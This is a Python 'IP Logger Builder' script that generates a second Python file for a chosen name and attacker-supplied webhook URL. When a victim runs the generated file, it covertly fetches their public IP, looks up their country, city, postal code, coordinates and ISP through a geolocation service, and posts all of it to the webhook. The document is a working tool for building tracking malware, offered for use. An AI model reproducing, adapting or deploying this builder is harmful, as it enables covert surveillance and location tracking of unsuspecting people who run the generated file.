import os
import sys

try:
    import requests
except Exception:
    while True:
        e = input("Requests Module Missing, Wanna Try Auto-Fix It (y/n): ")
        if e == "y" or e == "n":
            break
        print("Enter A Valid Choice")

    if e == "n":
        sys.exit()

    try:
        os.system("pip install requests")
        input(print("It Should Be Fixed Now, Press Enter To Start Main Program"))
    except Exception:
        input(print("Error Fixing, Press Enter To Close Program"))
        sys.exit()

os.system(
    "title "
    + "IP Logger Builder - Made by Nimp#2022 - Github: https://github.com/NimpReal"
)

while True:
    name = input("Name of the logger: ")
    if len(name) > 135:
        print("Name Too Long")
        continue
    break

code = """import requests
url = "https://api.ipify.org"
r = requests.get(url).text
requests.post(webhook, json={"content": f"@everyone ```Ip: {r}```"})
r2 = requests.get(f"http://ip-api.com/json/{r}").json()
"""
code2 = 'info = "Country: " + r2["country"] + "\n" +  "Country Code: " + r2["countryCode"] + "\n" + "Region Name: " + r2["regionName"] + "\n" + "City: " + r2["city"] + "\n" + "Zip Code: " + r2["zip"] + "\n" + "Lat: " + str(r2["lat"]) + "\n" + "Lon: " + str(r2["lon"]) + "\n" + "Timezone: " + r2["timezone"] + "\n" + "ISP: " + r2["isp"] + "\n" + "Org: " + r2["org"] + "\n" + "AS: " + r2["as"]'
code3 = 'requests.post(webhook, json={"content": f"```Ip Info: {info}```"})'

while True:
    try:
        webhook = input("Enter Your Webhook: ")
        r = requests.get(webhook)
        if 200 != r.status_code:
            print("Invalid Webhook")
            continue
    except Exception:
        print("Webhook Invalid")
        continue
    break

try:
    with open(f"{name}.py", "a") as file:
        file.write(f'webhook = "{webhook}"\n')
        file.write(code + repr(code2)[1:-1] + "\n" + code3)
except:
    input(print("Unknown Error"))
    sys.exit()

input(print("Succsesfully Made File"))
